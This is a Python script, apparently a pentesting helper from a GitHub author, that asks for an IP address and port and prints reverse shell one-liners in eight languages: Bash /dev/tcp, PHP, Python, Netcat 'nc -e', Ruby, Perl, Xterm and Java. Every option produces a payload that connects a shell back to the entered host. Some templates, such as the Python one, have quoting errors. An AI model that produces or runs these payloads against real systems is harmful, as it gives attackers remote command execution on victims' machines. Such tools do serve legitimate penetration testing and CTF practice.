#!/usr/bin/python3

import ipaddress
import socket
import keyboard
import sys

def menu():

    print("")
    print("RevShell // Done by https://github.com/Sxmpl3")
    print("")
    print("---> Press 1 -> Bash")
    print("")
    print("---> Press 2 -> PHP")
    print("")
    print("---> Press 3 -> Python")
    print("")
    print("---> Press 4 -> Netcat")
    print("")
    print("---> Press 5 -> Ruby")
    print("")
    print("---> Press 6 -> Perl")
    print("")
    print("---> Press 7 -> Xterm")
    print("")
    print("---> Press 8 -> Java")
    print("")

def check_parametrers():

    while True:
        
        ip = input("Enter an IP address: ")
        print()
        port = input("Enter a port: ")
        print()

        try:
            
            socket.inet_aton(ip)

            if 0 < int(port) < 65535:

                return ip, port
            
        except (socket.error, ValueError):

            pass

        print("Invalid IP address / port, try again.")    

# Reverse Shell Bash

def bash():
    
    print("Bash RevShell")
    print()

    ip, port = check_parametrers()
    
    print('---------------------------------------')
    print('---> bash -i >& /dev/tcp/'+ ip +'/' + port + ' 0>&1')
    print('---------------------------------------')

    exit_program()


def php():
    
    print("PHP RevShell")
    print()

    ip, port = check_parametrers()

    print('---------------------------------------')
    print("---> php -r '$sock=fsockopen("+ip +","+ port +");exec("'/bin/sh' '-i <&3 >&3 2>&3'");' ")
    print('---------------------------------------')

    exit_program()


def python():
    
    print("Python RevShell")
    print()

    ip, port = check_parametrers()

    print('---------------------------------------')
    print("---> python - c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+ip+","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']));'  ")
    print('---------------------------------------')

    exit_program()


def nc():
    
    print("NetCat RevShell")
    print()

    ip, port = check_parametrers()

    print('---------------------------------------')
    print ("---> nc -e /bin/sh "+ ip +" "+ port)
    print('---------------------------------------')

    exit_program()


def ruby():
    
    print("Ruby RevShell")
    print()

    ip, port = check_parametrers()

    print('---------------------------------------')
    print("---> ruby -rsocket -e'f=TCPSocket.open("+ ip +","+ port +").to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'  ")
    print('---------------------------------------')

    exit_program()


def perl():
    
    print("Perl RevShell")
    print("")

    ip, port = check_parametrers()

    print('---------------------------------------')
    print ("---> perl -e 'use Socket;$i="+ ip +";$p="+ port +";socket(S,PF_INET,SOCK_STREAM,getprotobyname("'tcp'"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'")
    print('---------------------------------------')

    exit_program()


def xterm():
    
    print("Xterm RevShell")
    print("")

    ip, port = check_parametrers()

    print('---------------------------------------')
    print('---> xterm -display'+ ip +':'+ port)
    print('---------------------------------------')

    exit_program()


def java():
    
    print("Java RevShell")
    print("")

    ip, port = check_parametrers()

    print('---------------------------------------')
    print('---> r = Runtime.getRuntime()')
    print('---> p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'+ ip +'/'+ port +';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])')
    print('---> p.waitFor()')
    print('---------------------------------------')

    exit_program()


def exit_program():

    print("")
    print("Write 'exit' to go back to the menu ")
    print("")

    user_input = input("---> ")

    if user_input == 'exit':

        sys.exit()


def main():

    menu()

    keyboard.on_press_key("1", lambda _: bash())

    keyboard.on_press_key("2", lambda _: php())

    keyboard.on_press_key("3", lambda _: python())

    keyboard.on_press_key("4", lambda _: nc())

    keyboard.on_press_key("5", lambda _: ruby())

    keyboard.on_press_key("6", lambda _: perl())

    keyboard.on_press_key("7", lambda _: xterm())

    keyboard.on_press_key("8", lambda _: java())
    
    keyboard.wait("esc")  



if __name__ == '__main__':

    main()



# Done by Sxmpl3































































# Done by Sxmpl3





















































































































































# Done by Sxmpl3